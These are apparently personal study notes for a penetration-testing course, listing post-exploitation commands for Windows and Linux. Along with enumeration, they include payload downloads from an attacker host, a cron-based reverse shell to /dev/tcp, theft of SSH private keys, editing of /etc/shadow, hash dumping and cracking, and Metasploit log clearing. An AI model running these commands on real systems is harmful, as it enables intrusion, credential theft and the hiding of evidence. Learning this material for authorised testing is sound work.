# Post-Exploitation Methodology

![[Post-Exploitation Methodology.png]]

# Windows Local Enumeration

###### Enumerating System Information
- What are we looking for?
	- Hostname
	- OS Name (Windows 7, 8 etc)
	- OS Build & Service Pack (Windows 7 SP1 7600)
	- OS Architecture (x64/x86)
	- Installed updates/Hotfixes
- After getting access to system (meterpreter cmds)
	- `getuid`
	- `sysinfo`
	- `shell`  -- give windows / Linux shell
		- `hostname`
		- `systeminfo` -- display all info including hotfixes
		- `wmic qfe get Caption,Description,HotFixID,InstalledOn`
###### Enumerating Users & Groups
- What are we looking for?
	- Current user & privileges
	- Additional user information
	- Other users on the system
	- Groups
	- Members of the built-in administrator group
- After getting access to system (meterpreter cmds)
	- `getuid`
	- `getprivs`
	- `shell`  -- give windows / Linux shell
		- `whoami`
		- `whoami /priv`
		- `query user` - give currently logged on user
		- `net users` -- display all other accounts on the user
		- `net user [user name]` -- give all info about the user
		- `net localgroup` and `net localgroup [group name]` 
- `use post/windows/gather/enum_logged_on_users`
###### Enumerating Network Information
- What are we looking for?
	- Current IP address & network adapter
	- Internal networks
	- TCP/UDP services running and their respective ports
	- Other hosts on the network
	- Routing table
	- Windows Firewall state
- After getting access to system (meterpreter cmds)
	- `shell`  -- give windows / Linux shell
		- `ipconfig` or `ipconfig /all`
		- `route print`
		- `arp -a`
		- `netstat -ano` -- list all open ports
		- `netsh firewall show state` or `netsh advfirewall firewall`
###### Enumerating Processes & Services
- What are we looking for?
	- Running processes & services
	- Scheduled tasks
- After getting access to system (meterpreter cmds)
	-  `ps`
	- `pgrep explorer.exe` -- give pid of explorer.exe
	- `migrate PID` 
- After getting access to system (meterpreter cmds)
	- `shell`  -- give windows / Linux shell
		- `net start` or `wmic service list brief`  -- give list of started services
		- `tasklist /SVC` -- list the process and the services
		- `schtasks /query /fo LIST /v`
###### Automating Windows Local Enumeration
- `post/windows/gather/enum_applications`
- `post/windows/gather/enum_computers` -- enum the other systems that are connected to that network
- `post/windows/gather/enum_patches`
- [JAWS](https://github.com/411Hall/JAWS)
	- copy the the script and paste it in your system/lab (ctrl+shif+alt to paste on lab)
	- nav to `C:\Temp`
	- `upload /path/of/file/from/your/sytem` -- meterpreter cmd
	- `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`
	- `download JAWS-enum.txt` -- meterpreter cmd

# Linux Local Enumeration
###### Enumerating System Information
- What are we looking for?
	- Hostname
	- Distribution & distribution release version
	- Kernel version & architecture
	- CPU information
	- Disk information & mounted drives
	- Installed packages/software
- After getting access to system (meterpreter cmds)
	- `sysinfo`
	- `shell`  -- give windows / Linux shell`
		- `/bin/bash -i`
		- `cat /etc/issue` or `cat /etc/*release`
		- `uname -a`
		- `lscpu`
		- `free -h` -- if utility is installed it will give ram info
		- `df -h` -- disk info
		- `lsblk | grep sd` or `lsblk`  -- storage device info
		- `dpkg -l` -- for installed pkg
###### Enumerating Users & Groups
- What are we looking for?
	- Current user & privileges
	- Other users on the system
	- Groups
- After getting access to system (meterpreter cmds)
	- `getuid`
	-  `shell`  -- give windows / Linux shell`
		- `/bin/bash -i`
		- `whoami`
		- `groups [account name]`
		- `usermod -aG root bob` -- this will add bob to root group
		- `cat /etc/passwd`
		- `last` -- display last login user (legitimate login authentication)
		- `lastlog` -- to display list of user that have logged into the system
###### Enumerating Network Information
- What are we looking for?
	- Current IP address & network adapter
	- Internal networks
	- TCP/UDP services running and their respective ports
	- Other hosts on the network
- After getting access to system (meterpreter cmds)
	- `ifconfig`
	- `netstat`
	- `route`
	- `arp`
	-  `shell`  -- give windows / Linux shell`
		- `/bin/bash -i`
		- `ifconfig` or `ip a s` or `cat /etc/networks`
		- `hostname` or `cat /etc/hostname`
		- `cat /etc/hosts`
		- `cat /etc/resolv.conf` -- for dns info
		- `arp -a`
###### Enumerating Processes & Cron Jobs
- What are we looking for?
	- Running services
	- Cron Jobs
- After getting access to system (meterpreter cmds)
	- `ps`
	- `shell`  -- give windows / Linux shell`
		- `/bin/bash -i`
		- `ps aux`
		- `top`
		- `crontab -l` or `ls -la /etc/cron*`
###### Automating Linux Local Enumeration
- [LinEnum](https://github.com/rebootuser/LinEnum)
	- copy the the script and paste it in your system/lab (ctrl+shif+alt to paste on lab)
	- nav to `cd /tmp`
	- `upload /path/of/file/from/your/sytem` -- meterpreter cmd
	- `shell` then `/bin/bash -i`
	- `chmod +x LinEnum.sh` 
	- `./LinEnum.sh`

# Transferring Files
###### Setting Up A Web Server With Python
- Python comes with a built-in module known as SimpleHTTPServer(python2) and http.server (python3)
	- `python2 -m SimpleHTTPServer 80`
	- `python3 -m http.server 80`
###### Transferring Files To Windows Targets
- `python -m SimpleHTTPServer 80` -- on your machine
- `certutil -urlcache -f http://[Your IP]/payload.exe payload.exe` -- on attacker/victim machine
###### Transferring Files To Linux Targets
- `tmux` -- for multi terminal ]
	- `ctrl+B C` for new terminal
	- `ctrl+B [bash no 0 or 1 or 2 and so on]` - to switch between termianl
	- `exit` -- to close the terminal
- `python3 -m http.server 80`
- `wget htptp://[Your IP]/payload`
# Shells
- `/etc/shells` -- to display what shell is installed
# Escalation
###### Windows Privilege Escalation
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
	- `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
- `exploit/multi/script/web_delivery`
	- `set target PSH\ (Binary)`
	- `set payload windows/shell/reverse_tcp`
	- `set PSH-EncodedCommand false`
	- `set LHOST eth1`
	- `exploit`
	- copy the PSH code and paste it in victim cmd prompt and we have victim system
###### Linux Privilege Escalation
- `find / -not -type l -perm -o+w` -- this will list out files that can be modified by any user on the system, regardless of their permission
- if we have permission to read/write /etc/shadow
	- `openssl passwd -1 -salt abc password` -- this will give hash for password
	- then we can replace * with that hash in /etc/shadow
- if `sudo -l` give `/usr/bin/man`
	- `sudo man ls`
	- `!/bin/bash` -- in the man page
# Persistence
- [MITRE](https://attack.mitre.org/)
###### Windows Persistence
- Persistence via Services 
	- same as [[The Metasploit Framework (MSF)#Windows Post Exploitation]] (Establishing Persistence On Windows)
- Persistence via RDP
	- `run getgui -e -u [username] -p [password]` -- meterpreter cmd
###### Linux Persistence
- Persistence Via SSH Keys
	- `scp username@IP:~/.ssh/id_rsa .` -- this will copy the private key of the user
		- `chom 400` -- permission for private key
- Persistence Via Cron Jobs
	- ![[Anatomy Of A Cron Job.png]]
	- you can set up a cron job even if you don't have elevated priv because most user account have permission to create cron
	- `cat /etc/cron*`
	- `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/1234 0>&1'" > cron`
	- `crontab -i cron` -- added as cronjob
	- `crontab -l` --display all cron
# Dumping & Cracking
###### Dumping & Cracking Windows Hashes
- In modern versions of Windows, the SAM database is encrypted with a syskey.
- Elevated/Administrative privileges are required in order to access and interact with the LSASS process.
- `hashdump` -- to dump NTLM hashes
- `john [HashFILE]--wordlist=/home/anurag/Downloads/rockyou.txt --format=NT ` -- to crack hashdump
- `hashcat -a3 -m 1000 hases.txt /usr/share/wordlists/rockyou.txt` -- to crack hashes (`gzip -d /usr/share/wordlists/rockyou.txt.gz)
###### Dumping & Cracking Linux Hashes
-  `john [HashFILE]--wordlist=/home/anurag/Downloads/rockyou.txt --format=sha512crypt ` -- to crack hashdump
- `hashcat -a3 -m 1800 hases.txt /usr/share/wordlists/rockyou.txt` -- to crack hashes (`gzip -d /usr/share/wordlists/rockyou.txt.gz)

# Pivoting Lesson

- refer [[The Metasploit Framework (MSF)#^b2b32b]]
- We can use ping_seep or arp_scanner module of msfconsole to find all the internal ips (
	- set rhosts 10.0.21.0/20
- then after the IP use portscan
# Clearing
- `clearev` -- msf cmd to clear windows logs
- `resource script.rb` -- if the script is given you can use it in mfs to delete everything pertaining to that module